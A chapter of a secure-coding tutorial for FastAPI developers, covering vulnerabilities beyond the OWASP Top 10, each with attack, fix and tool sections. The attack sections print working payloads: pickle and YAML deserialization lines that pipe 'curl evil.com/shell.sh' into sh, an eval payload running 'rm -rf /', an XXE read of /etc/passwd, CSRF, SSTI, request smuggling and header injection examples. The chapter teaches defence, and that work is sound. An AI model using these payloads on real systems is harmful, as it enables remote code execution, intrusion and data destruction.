# Part 4 — Beyond OWASP
### The vulnerabilities the Top 10 doesn't cover (but you'll see in real code)

This part is the "everything else". Some of these are *just outside* the top 10; some are *so common* that I'm honestly not sure why they're not in the top 10. Each section has the same structure: **what, why, attack, fix, tool**.

---

## 4.1 Cross-Site Request Forgery (CSRF) — A05-era, still very real

### What
A logged-in user visits `evil.com`. A hidden form on that page POSTs to your `/transfer` endpoint. The browser sends the user's session cookie. Your server processes the request as if the user made it.

### Why
Cookie-based auth is the default for most web apps. Browsers send cookies automatically with cross-origin requests *unless* the endpoint requires a non-standard header (which Bearer tokens effectively do).

### Attack

```html
<!-- evil.com/attack.html -->
<form action="https://yourbank.com/transfer" method="POST" id="f">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('f').submit();</script>
```

If the user is logged in to yourbank.com, the cookie goes along, and the transfer happens.

### Fix

Three layers, in order of importance:

1. **SameSite cookies** — `Set-Cookie: session=...; SameSite=Lax` (or `Strict`). Modern browsers default to `Lax`. This blocks the above attack in most cases.
2. **CSRF token** — for state-changing endpoints, require a per-session, per-request token. The server compares the token in a hidden form field (or `X-CSRF-Token` header) with the one in the session.
3. **Origin/Referer check** — reject state-changing requests where `Origin` doesn't match your domain.

```python
from fastapi import Depends, HTTPException
from starlette.requests import Request
import secrets

def get_csrf_token(request: Request) -> str:
    token = request.session.get("csrf")
    if not token:
        token = secrets.token_urlsafe(32)
        request.session["csrf"] = token
    return token

@app.post("/transfer")
async def transfer(request: Request,
                   csrf: str = Depends(get_csrf_token)):
    body = await request.json()
    if body.get("csrf_token") != request.session.get("csrf"):
        raise HTTPException(403, "CSRF token mismatch")
    # ... do the transfer
```

**In FastAPI with Starlette sessions**, you can also use `fastapi-csrf-protect` or roll your own with `starlette.middleware.sessions`.

### Tool
- **fastapi-csrf-protect** (PyPI)
- **OWASP CSRFGuard** for Java apps
- **Burp Suite** has a CSRF PoC generator

---

## 4.2 Insecure Deserialization (the deep dive)

### What
The app takes a byte stream (or string) from an untrusted source, parses it with a powerful deserializer, and an attacker can craft input that, when deserialized, executes arbitrary code.

### Why
`pickle`, `yaml.load`, `eval`, `exec`, `marshal`, and a few others can be told to *call functions* or *instantiate classes* during deserialization. The attacker uses that capability to run a shell command.

### Attack — `pickle` RCE

```python
import pickle
# Vulnerable
data = await req.body()
obj = pickle.loads(data)        # ❌ full RCE
```

```python
# Attacker crafts a malicious pickle
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ("curl evil.com/shell.sh | sh",))
payload = pickle.dumps(Exploit())
# Send `payload` as the request body.
```

When the server calls `pickle.loads(payload)`, it calls `os.system("curl evil.com/shell.sh | sh")` — RCE.

### Attack — `yaml.load` RCE

```python
import yaml
data = await req.body()
obj = yaml.load(data)           # ❌ same problem
```

```yaml
# Malicious YAML
!!python/object/apply:os.system
  - "curl evil.com/shell.sh | sh"
```

### Attack — `eval` RCE

```python
result = eval(f"compute({user_input})")     # ❌
```

```python
# Attacker sends: __import__('os').system('rm -rf /')
```

### Fix

| Dangerous | Safe replacement |
|-----------|------------------|
| `pickle.loads` | `json.loads` |
| `yaml.load` | `yaml.safe_load` (only `!!str`, `!!int`, etc. — no Python objects) |
| `eval` / `exec` | Never. There is no safe `eval`. Use a real parser. |
| `marshal.loads` | Don't deserialize marshal from untrusted sources |
| `shelve.open` | Don't use it for untrusted data |
| `xml.etree` (default) | For XXE protection, use `defusedxml` |

If you genuinely need a binary format, **MessagePack** or **CBOR** with a strict schema (Protocol Buffers, Avro) is the right answer. Never use a format that can represent code.

```python
# Safe YAML
import yaml
data = yaml.safe_load(user_input)

# Safe XML
import defusedxml.ElementTree as ET
tree = ET.fromstring(user_input)
```

### Tool
- **Bandit** flags `pickle`, `yaml.load`, `eval`, `exec` (`B301`, `B302`, `B307`, `B102`, `B103`).
- **Semgrep** has `python.lang.security.deserialization` rules.

---

## 4.3 XXE — XML External Entity Injection

### What
The XML parser is configured to expand external entities. The attacker defines an entity in the XML that reads a local file or hits a remote URL. When the parser expands the entity, the file is read or the URL is fetched.

### Why
Old XML libraries (`lxml`, `xml.etree`, `libxml2`) default to "expand external entities" because the XML 1.0 spec says they can. Almost no one *needs* this feature; almost everyone forgets to turn it off.

### Attack

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```

The vulnerable server reads the request as XML, the parser sees the `xxe` entity pointing at `/etc/passwd`, and inlines the file's contents into the `<name>` element.

### Variants

- **File read** (above)
- **SSRF** via `<!ENTITY xxe SYSTEM "http://internal:8080/admin">`
- **DoS** via the "billion laughs" attack (`<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">...`)

### Fix

```python
import defusedxml.ElementTree as ET
tree = ET.fromstring(xml_bytes)
# defusedxml blocks external entities and billion laughs by default
```

If you must use `lxml`, configure it strictly:

```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False)
tree = etree.fromstring(xml_bytes, parser)
```

### Tool
- **defusedxml** (PyPI) — drop-in replacement.
- **Semgrep** `python.lang.security.xml` ruleset.

---

## 4.4 Server-Side Template Injection (SSTI)

### What
A user-controlled string is rendered as a template (not as a string). The template engine evaluates expressions inside `{{ }}` or `${ }`, giving the attacker the full power of the engine.

### Why
Developers want "dynamic content" in error pages, emails, or admin views. They pipe user input into `render_template_string` (Jinja2) or `Template(...)`. The user's string is now code.

### Attack

```python
# Vulnerable
from fastapi.responses import HTMLResponse
from jinja2 import Template

@app.get("/hello")
def hello(name: str):
    return HTMLResponse(Template(f"Hello, {name}!").render())    # ❌
```

```bash
curl 'localhost:8000/hello?name={{7*7}}'
# Returns: Hello, 49!

curl "localhost:8000/hello?name={{ config.items() }}"
# Returns: all of Flask/FastAPI config — secret keys, DB URLs, etc.

curl "localhost:8000/hello?name={{ ''.__class__.__mro__[1].__subclasses__() }}"
# RCE via Python class hierarchy (SSTI playground)
```

### Fix

Pass user input as a variable, never as template code:

```python
from jinja2 import Environment, FileSystemLoader
env = Environment(loader=FileSystemLoader("templates"))

@app.get("/hello")
def hello(name: str):
    tmpl = env.get_template("hello.html")        # <h1>Hello, {{ name }}!</h1>
    return HTMLResponse(tmpl.render(name=name))  # name is escaped by Jinja2 auto-escape
```

If you must use `Template` on user input, **never** — but if you have no choice, sandbox the environment (Jinja2's `SandboxedEnvironment`) and disable dangerous features.

### Tool
- **Bandit** flags `jinja2.Template(...)` constructed from a variable.
- **Tplmap** — automated SSTI detection and exploitation.

---

## 4.5 Race Conditions (TOCTOU — Time-Of-Check to Time-Of-Use)

### What
A check and an action that depend on each other are separated in time. The attacker modifies the state between the check and the action.

### Why
Web apps are concurrent. The check happens in one request, the action in another (or in a transaction, or in a worker). The attacker wins the race by sending the second request before the first finishes.

### Attack — gift card double-spend

```python
# Vulnerable
@app.post("/redeem")
def redeem(code: str, user: User = Depends(get_current_user),
           db: AsyncSession = Depends(get_db)):
    card = db.get(GiftCard, code)
    if card.balance < 100:                          # ← CHECK
        raise HTTPException(400, "Insufficient balance")
    # ← Imagine a slow operation here (e.g., a webhook call)
    card.balance -= 100                              # ← USE
    db.commit()
    return {"new_balance": card.balance}
```

```bash
# Attack: send 10 concurrent requests
for i in {1..10}; do
  curl -X POST localhost:8000/redeem -d "code=ABC123" -H "Authorization: Bearer $TOKEN" &
done; wait
# If the card had $100, you might end up with $0 — or with a negative balance if no DB constraint.
```

### Fix

1. **Use a database constraint** to make the unsafe state unrepresentable:
   ```sql
   ALTER TABLE gift_cards ADD CONSTRAINT balance_nonneg CHECK (balance >= 0);
   ```
2. **Use `SELECT ... FOR UPDATE`** to lock the row during the transaction.
3. **Make the operation atomic** — one `UPDATE` with a `WHERE` clause that includes the precondition:
   ```python
   result = db.execute(
       update(GiftCard)
       .where(GiftCard.code == code, GiftCard.balance >= 100)  # ← atomic check
       .values(balance=GiftCard.balance - 100)
   )
   if result.rowcount == 0:
       raise HTTPException(400, "Insufficient balance")
   db.commit()
   ```

### Other famous race conditions
- **Limit-overrun** (vote twice, withdraw $1000 from $500 account, claim coupon multiple times)
- **Time-of-check to time-of-file** (file upload: check `.jpg` extension → save → re-read content and trust the path)
- **Symbolic-link swap** (write to `/tmp/myapp/upload.tmp` → attacker replaces the directory with a symlink to `/etc/`)

### Tool
- **Semgrep** has rules for `SELECT FOR UPDATE` patterns and atomic-update detection.
- **Code review** — look for "check, then act" with a non-trivial gap.

---

## 4.6 Regular Expression Denial of Service (ReDoS)

### What
A user-controlled regex (or a regex applied to user input) has a "catastrophic backtracking" pattern. On certain inputs, the regex engine takes exponential time.

### Why
Regexes are little programs. Most developers don't know that `(a+)+$` is exponential. Most regex engines don't bound the time.

### Attack

```python
import re
# Vulnerable: classic evil regex
pattern = re.compile(r"^(\w+\s?)+$")    # ← (x+)+ → exponential
data = "a" * 50 + "!"                   # ← fails the match, but takes forever to fail
re.match(pattern, data)
```

A 50-character string can take *minutes* against this pattern. A 100-character string can take *hours*.

### Fix

1. **Use `re2`** — Google's regex engine that guarantees linear time:
   ```python
   import re2   # `pip install pyre2`
   pattern = re2.compile(r"^(\w+\s?)+$")
   re2.match(pattern, data)    # bounded time
   ```
2. **Avoid catastrophic patterns**: nested quantifiers `(a+)+`, `(a*)*`, `(a|b)+` with overlapping alternations.
3. **Use `regex` module with timeout** (Python 3.11+ — `regex.Pattern.match` with `timeout=` kwarg).
4. **Set a request-level timeout** so even if the regex hangs, the request is killed.

### Tool
- **rxxr2** (online analyzer that flags evil patterns).
- **redos-detector** (GitHub) — lints regexes.

---

## 4.7 Clickjacking (UI Redress)

### What
The attacker loads your site inside an iframe on `evil.com`, overlays it with a transparent layer, and tricks the user into clicking buttons they didn't intend to click. ("Click here to claim your prize" — actually clicks "Delete my account".)

### Why
Modern browsers will happily iframe your site unless you say no. Most apps don't say no.

### Fix

Three controls, in order of robustness:

1. **`X-Frame-Options: DENY`** (or `SAMEORIGIN` if you do need iframes on your own pages).
2. **`Content-Security-Policy: frame-ancestors 'none'`** — modern replacement.
3. **JavaScript frame-buster** (legacy, unreliable):

   ```js
   if (top !== self) top.location = self.location;
   ```

The first two are headers — we already added them in the security-headers middleware in Part 2.

---

## 4.8 Subdomain Takeover

### What
You point a DNS record at a service you no longer control (e.g., `blog.example.com` → `mycompany.herokuapp.com`). You delete the Heroku app. The DNS record still points there. An attacker claims the same Heroku name and serves content on your subdomain.

### Why
Developers spin up staging environments, point DNS at them, then forget to clean up the DNS when the environment is decommissioned.

### Fix

1. **Inventory your DNS records regularly** — `subfinder`, `amass`, `assetfinder` to enumerate subdomains.
2. **Don't point CNAMEs at services you don't own.**
3. **Set short TTLs** so stale records expire fast.
4. **Monitor** for "dangling DNS" with tools like `subjack`, `can-i-take-over-xyz`.

---

## 4.9 HTTP Request Smuggling

### What
A proxy (NGINX, HAProxy, CloudFront) and the backend disagree on how to parse the `Content-Length` / `Transfer-Encoding` headers. The attacker smuggles a second request inside the first. The proxy sees one request, the backend sees two.

### Why
HTTP/1.1 keeps two ways to specify body length — `Content-Length` and `Transfer-Encoding: chunked`. If both are present and the proxy and backend disagree about which one wins, the result is smuggling.

### Attack

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin/delete-user/1 HTTP/1.1
Host: example.com
```

The proxy sees `Content-Length: 44` and forwards 44 bytes. The backend sees `Transfer-Encoding: chunked` and reads the `0` as end-of-chunks, then reads the smuggled `GET /admin/...` as a new request.

### Fix

- **Use HTTP/2** end-to-end (no CL/TE ambiguity).
- **Reject** requests with both `Content-Length` and `Transfer-Encoding`.
- **Don't use HTTP/1.1 between proxy and backend** if you can avoid it.

### Tool
- **smuggler** (PortSwigger), **h2csmuggler**.

---

## 4.10 Mass Assignment

### What
The framework auto-binds request fields to model fields. The attacker sends extra fields (`is_admin=true`) that the dev didn't think to filter.

### Why
Convenience. Most ORMs and frameworks will fill in every field that matches by name.

### Attack

```python
# Vulnerable
class User(BaseModel):
    email: str
    is_admin: bool = False

@app.post("/users")
def create_user(data: User, db: AsyncSession = Depends(get_db)):
    user = UserModel(**data.model_dump())     # ❌ is_admin is user-controllable
    db.add(user); db.commit()
```

```bash
curl -X POST localhost:8000/users -H 'Content-Type: application/json' \
  -d '{"email":"evil@evil.com","is_admin":true}'
# You're an admin.
```

### Fix

**Use separate schemas for input and output:**

```python
class UserCreate(BaseModel):
    email: EmailStr
    password: str

class UserOut(BaseModel):
    id: int
    email: EmailStr
    is_admin: bool

@app.post("/users", response_model=UserOut)
def create_user(data: UserCreate, db: AsyncSession = Depends(get_db)):
    user = UserModel(email=data.email, password_hash=argon2.hash(data.password))
    db.add(user); db.commit()
    return user
# Server controls the fields. Client cannot set is_admin.
```

In Pydantic v2, you can also set `model_config = ConfigDict(extra="forbid")` to reject unknown fields.

### Tool
- **Code review** — look for `**data.dict()` or `**data.model_dump()` without an explicit allowlist.
- **Semgrep** `python.fastapi.security.audit.mass-assignment`.

---

## 4.11 Insecure File Upload

### What
The user uploads a file. You save it to a public directory. The file is served back with the same content type, even if it's a PHP shell, a JS file, an HTML page with XSS, or a polyglot (a file that is both a valid image and a valid script).

### Why
File uploads are deceptively hard. You have to validate content, validate type, sanitize filename, store outside the web root, and serve with the right `Content-Type` and `Content-Disposition: attachment`.

### Attack

```python
# Vulnerable
@app.post("/upload")
async def upload(file: UploadFile = File(...)):
    path = f"./static/uploads/{file.filename}"
    with open(path, "wb") as f:
        f.write(await file.read())      # ❌ no validation
    return {"path": path}
```

```bash
# Upload a PHP shell named shell.php.jpg
curl -X POST localhost:8000/upload -F 'file=@shell.php.jpg'
# If the server uses the extension for routing (e.g., nginx has .php -> php-fpm), RCE.
# If the server serves with Content-Type: text/html, XSS.
```

### Fix

1. **Validate content type** (not just file extension). Use `python-magic` to check the actual magic bytes.
2. **Generate a new filename** — never trust the user-provided name.
3. **Store outside the web root** and serve via a separate route that sets strict `Content-Type` and `Content-Disposition: attachment`.
4. **Size limits** — FastAPI's `UploadFile` has a `size` you can check.
5. **Strip metadata** for images (EXIF can leak GPS coordinates).
6. **Run a virus scanner** (`clamd` or `ClamAV`).

```python
import secrets, magic
from pathlib import Path

ALLOWED_MIMES = {"image/png", "image/jpeg", "image/webp"}
MAX_SIZE = 5 * 1024 * 1024  # 5 MB

@app.post("/upload")
async def upload(file: UploadFile = File(...)):
    data = await file.read()
    if len(data) > MAX_SIZE:
        raise HTTPException(413, "Too large")
    mime = magic.from_buffer(data, mime=True)
    if mime not in ALLOWED_MIMES:
        raise HTTPException(415, f"Bad type: {mime}")
    ext = {"image/png": "png", "image/jpeg": "jpg", "image/webp": "webp"}[mime]
    name = f"{secrets.token_urlsafe(16)}.{ext}"
    dest = Path("./uploads") / name
    dest.write_bytes(data)
    return {"id": name, "url": f"/files/{name}"}

@app.get("/files/{name}")
def serve(name: str):
    # Strict serve — always attachment, correct mime
    if not name.isalnum() or len(name) > 64:    # ← no path traversal
        raise HTTPException(400)
    path = Path("./uploads") / name
    if not path.exists():
        raise HTTPException(404)
    return FileResponse(path, filename=name)    # ← Content-Disposition: attachment
```

---

## 4.12 OAuth Misconfigurations

### What
OAuth is the most common way to delegate auth, and the most misconfigured. The attack surface is the redirect_uri, the state parameter, the scopes, the token storage, and the PKCE flow.

### Common bugs
- **Missing `state`** → CSRF against the OAuth flow (attacker logs you into their account).
- **`redirect_uri` not strictly validated** → open redirect that captures the auth code.
- **Implicit flow** instead of authorization code + PKCE → tokens in URL.
- **Overly broad scopes** → app requests `email`, `profile`, `*`, when it only needs `openid`.
- **Token in localStorage** → XSS-stealable.
- **No `aud` (audience) check on JWTs** → token issued for app A works on app B.
- **No PKCE** → auth code interception attack.

### Fix

Use **Authlib** or **OAuthLib** (battle-tested) and follow the OAuth 2.0 Security Best Current Practice (RFC 9700):
- Always PKCE.
- Always exact-match `redirect_uri` (no wildcards, no paths you don't expect).
- Always `state` parameter, server-generated, server-verified.
- Use authorization code flow, not implicit.
- Tokens in HTTP-only cookies, not localStorage.
- Validate `iss`, `aud`, `exp`, `nbf` on the JWT.

---

## 4.13 JWT Pitfalls (the deep dive beyond A02)

### What
JWT looks simple, but every part of the spec is a sharp edge.

### The eight JWT footguns

1. **`alg=none`**: some libraries accept tokens with no signature. Attacker crafts a token.
   ```json
   {"alg":"none","typ":"JWT"}.<base64-payload>.
   ```
2. **HS256 with a guessed key**: if your key is "secret", it's brute-forced in seconds. `jwt_tool` or `hashcat -m 16500`.
3. **Algorithm confusion (RS256 → HS256)**: server expects RS256 with a public key. Attacker sends HS256 token signed *using the public key as the secret*. If the library blindly uses the configured key as a secret regardless of `alg`, the attack works.
4. **`kid` injection**: `kid` is supposed to be a key ID. Some apps concatenate it into a file path or SQL query. `kid="../../dev/null"` → empty signing key → forge any token.
5. **`jku` / `x5u` injection**: token says "verify with this URL's key". If the library fetches it, the attacker hosts their own key.
6. **No `exp` check**: tokens valid forever.
7. **No `iss`/`aud` check**: token issued for app A is accepted by app B.
8. **Sensitive data in payload**: payload is base64, not encrypted. Don't put PII there.

### Fix (use python-jose, pin algorithm)

```python
from jose import jwt, JWTError

SECRET = os.environ["JWT_SECRET"]   # 256+ bits, asymmetric in prod
PUBLIC_KEY_PATH = "/etc/secrets/jwt.pub"

def verify(token: str) -> dict:
    try:
        with open(PUBLIC_KEY_PATH) as f:
            pub = f.read()
        return jwt.decode(
            token, pub,
            algorithms=["RS256"],          # ← exact list
            audience="myapp",
            issuer="myapp-auth",
            options={"require": ["exp", "iss", "aud"]},
        )
    except JWTError:
        raise HTTPException(401)
```

### Tool
- **jwt_tool** (Python) — for testing.
- **hashcat -m 16500** — for brute-forcing HS256.
- **PortSwigger's JWT labs** — interactive learning.

---

## 4.14 Information Disclosure

### What
The app leaks data it shouldn't. Through error messages, stack traces, debug endpoints, robots.txt, source maps, comments in HTML, internal IPs in stack traces, Git directories, etc.

### Common leaks
- `.git/` directory served
- `__pycache__/*.pyc` served (Python bytecode — source-like)
- `.env` file served
- Verbose errors in prod (`DEBUG=True` in Django = `DisallowedHost` pages with `ALLOWED_HOSTS` list, settings dump, etc.)
- Stack traces with `os.environ` keys
- Comments in HTML: `<!-- TODO: remove this before prod -->`
- Source maps: `main.js.map` reveals original code
- `/api/v1/users/1` returns more fields than `/api/v2/users/1`
- Verbose `WWW-Authenticate: Basic realm="internal-staging-eu-west-1"`
- Banner grabbing: SSH, SMTP, etc., reveal versions

### Fix

1. **Disable debug in prod.** Pydantic `Settings.debug = False` always.
2. **Custom 404/500 pages** that don't leak internals.
3. **Strip server headers**: `Server: nginx` → `Server: `.
4. **Disable directory listing.**
5. **Block `.git`, `.env`, `*.pyc`, `*.map`** at the reverse proxy.
6. **Return generic errors** to clients, detailed errors only in logs.

### Tool
- **Nikto** — old-school web scanner.
- **dirsearch** — finds hidden paths.
- **Mozilla Observatory**.

---

## 4.15 Side-Channel / Timing Attacks

### What
The app's *behavior* (time, power, error response, cache, etc.) leaks information. The classic: comparing strings with `==` leaks the matching prefix length because `==` short-circuits.

### Attack

```python
# Vulnerable: timing leak
def check(token: str) -> bool:
    return token == SECRET_TOKEN
# If attacker sends "a" then "b" then "c"...
# The first mismatching character takes longer to return False.
# Iterate, leak token one char at a time.
```

### Fix

```python
import hmac
def check(token: str) -> bool:
    return hmac.compare_digest(token, SECRET_TOKEN)    # ← constant time
```

Other side-channels to know:
- **Padding oracle** (Bleichenbacher): an endpoint that returns different errors for "bad padding" vs "bad MAC" lets the attacker decrypt any ciphertext. Affects RSA-PKCS1v1.5. Use OAEP.
- **Cache timing** on shared hosts: AES table lookups can leak key bits. Use constant-time AES (AES-NI, or `cryptography`'s default backend).
- **Spectre / Meltdown**: speculative execution in CPUs can leak across processes. Mitigated by OS + microcode, but architectural risk.
- **Email-based timing**: returning "user not found" faster than "wrong password" leaks whether the email exists. Always do the same work (hash a dummy password) on both paths.

---

## 4.16 Open Redirect

### What
The app has a feature like `?next=/dashboard` for post-login redirects. The attacker sends `?next=https://evil.com/phish`. The user logs in, gets redirected to a phishing page that looks like your site.

### Attack

```python
# Vulnerable
@app.get("/login/callback")
def callback(next: str, ...):
    return RedirectResponse(next)    # ❌ attacker controlled
```

```bash
https://yourapp.com/login?next=https://evil.com/yourapp-fake-login
```

### Fix

```python
from urllib.parse import urlparse

ALLOWED_HOSTS = {"yourapp.com", "www.yourapp.com"}

@app.get("/login/callback")
def callback(next: str, request: Request):
    # Only allow same-origin paths
    if not next.startswith("/") or next.startswith("//"):
        raise HTTPException(400)
    # Reconstruct absolute URL and check host
    target = urlparse(next)
    if target.netloc and target.netloc not in ALLOWED_HOSTS:
        raise HTTPException(400)
    return RedirectResponse(next)
```

---

## 4.17 Prototype Pollution / Class Pollution (Python)

### What
In JS, `Object.assign` or recursive merge on untrusted JSON lets an attacker set `__proto__` properties, polluting all objects. In Python, "class pollution" via `pickle` or `setattr` is the analog.

### Attack — JS example (most common context)
```js
// Vulnerable
function merge(target, source) {
  for (let key in source) target[key] = source[key];
}
merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
// Now {} instanceof Object has isAdmin = true.
```

### Fix

- **JS**: use `Object.create(null)` for dicts from untrusted input; use `Map` instead of `{}`; never use recursive merge on user input.
- **Python**: don't `setattr` on user-controlled key names. Use explicit allowlists.

---

## 4.18 HTTP Response Header Injection

### What
The user can inject `\r\n` into a header value, smuggling a second header or even a second response.

### Attack

```python
# Vulnerable
@app.get("/redirect")
def redirect(url: str):
    return Response(headers={"Location": url})     # ❌ url can contain \r\n
```

```bash
curl -i 'localhost:8000/redirect?url=/ok%0d%0aSet-Cookie:%20admin=true'
# Returns:
# HTTP/1.1 302 Found
# Location: /ok
# Set-Cookie: admin=true
# ← injected header
```

### Fix
- Use a library that validates header values, or pre-validate (`\r`, `\n`, `\0` not allowed).
- FastAPI/Starlette generally blocks this — but custom responses and `Response(headers=...)` don't.

---

## 4.19 Prototype Pollution in Python (the lesser-known cousin)

The bigger problem in Python is **`__class__`, `__bases__`, `__subclasses__`** abuse through template engines and certain ORMs. Mostly a concern with Jinja2 SSTI (covered in 4.4) and YAML deserialization (covered in 4.2).

---

## 4.20 Business Logic Flaws

The hardest class — not a "vulnerability" in the CVE sense, just a missing rule.

Examples:
- "Buy 1, get 1 free" applied to negative quantities → free money.
- Coupon `SAVE100` applied after discount calculation → 100% off.
- Race condition on coupon redemption → coupon used 1000 times.
- "Transfer" endpoint without daily limit → drain account.
- "Profile update" accepts another user's `id` → change someone else's profile.
- "Add to cart" with negative price.
- "Search" returns results *across* tenants because tenant filter is on the wrong column.

These don't show up in any linter. The fix is:
1. **Specification before code** — write down the rules in plain English.
2. **State machines** for workflows (Part 2, A04).
3. **Database constraints** for invariants (`CHECK (price > 0)`).
4. **Tests that try to break the rules** — write tests as an attacker would.

---

## 4.21 Other "less common but you'll see them"

| Vulnerability | One-liner |
|---------------|-----------|
| **HTTP Parameter Pollution** | `?id=1&id=2` — different backends pick different ones |
| **CRLF injection** | Newline in a header or log → log injection / header injection |
| **Host header injection** | `Host: evil.com` → password reset link points to evil.com |
| **Email header injection** | `To: victim\nBcc: attacker` → mass-mail attack |
| **Zip slip** | Upload a zip that writes to `../../../etc/cron.d/...` |
| **Path traversal in tarball** | Same idea, tar |
| **XML Quadratic Blowup** | Like ReDoS, but in XML expansion |
| **Unicode normalization** | `ﬁ` (U+FB01) vs `fi` (U+0066 U+0069) — could bypass a filter |
| **IDNA homograph** | `аpple.com` (Cyrillic 'a') vs `apple.com` |
| **Session fixation** | Attacker sets the session ID, user logs in with it |
| **Cookie theft via XSS** | `document.cookie` (mitigate with `httponly`) |
| **Cache poisoning** | Tricking a CDN into caching a malicious response for a popular URL |
| **Tabnabbing** | `window.opener.location = 'phish'` from a target=_blank link |
| **Mixed content** | HTTPS page loads HTTP subresource → downgrade |
| **CSP bypass via JSONP** | Old endpoints on the same origin can be used to bypass CSP |
| **DNS rebinding** | Attacker DNS resolves to your server's IP, browser trusts the origin |
| **TOCTOU file race** | `/tmp/myapp/sock` — replace with symlink before write |
| **Log4Shell-style** | Untrusted string logged with JNDI lookup (Java, not Python, but know it) |
| **Dependency confusion** | `pip install mycompany-internal` resolves to a public package with the same name |
| **Typosquatting** | `reqests` instead of `requests` |
| **Time-of-check vs time-of-use** | Already covered under race conditions |

---

## 4.22 What about the **physical** and **human** layers?

- **Social engineering** — phishing, vishing, smishing, deepfake voice calls. Mitigated by MFA, training, and processes.
- **Insider threat** — disgruntled employees, contractors with over-broad access. Mitigated by least privilege + audit logs.
- **Physical access** — lost laptops, tailgating into the office. Mitigated by full-disk encryption, screen locks, badge access.
- **Supply chain** — see A08 in Part 2.

These aren't "secure coding" per se, but every secure-coding checklist should mention them — a perfectly coded API doesn't help if the laptop with the prod creds is stolen.

---

## 4.23 The 1-page "if you only read one thing" cheat sheet

```
✓ Validate input at every trust boundary. Pydantic models.
✓ Authorize every endpoint. Check ownership. Check role.
✓ Parameterize every query. Never f-string into SQL.
✓ Hash passwords with Argon2id. Salted. Memory-hard.
✓ Use TLS 1.2+ everywhere. Verify outbound certs.
✓ Sign cookies, JWTs, webhooks. HMAC. Constant-time compare.
✓ Escape output. JSON for data, Jinja2 auto-escape for HTML.
✓ Disable debug. Set security headers. Hide /docs in prod.
✓ Pin and audit dependencies. pip-audit. Renovate.
✓ Rate-limit auth endpoints. Lockout after N fails. CAPTCHA.
✓ Log auth events. Log admin actions. Don't log secrets.
✓ Use parameterized queries, ORMs, and binding in psycopg.
✓ Sign all updates. Verify signatures. Use Sigstore.
✓ Treat URLs, filenames, and SQL identifiers as tainted.
✓ Use a state machine for workflows. A DB constraint for invariants.
✓ Run Bandit, Semgrep, pip-audit, Trivy in CI.
✓ Threat-model new features with STRIDE.
✓ Update this list. The OWASP list does.
```

Now open `05-fastapi-progression.md` — the same Todo app, rewritten 7 times, each version more secure than the last.
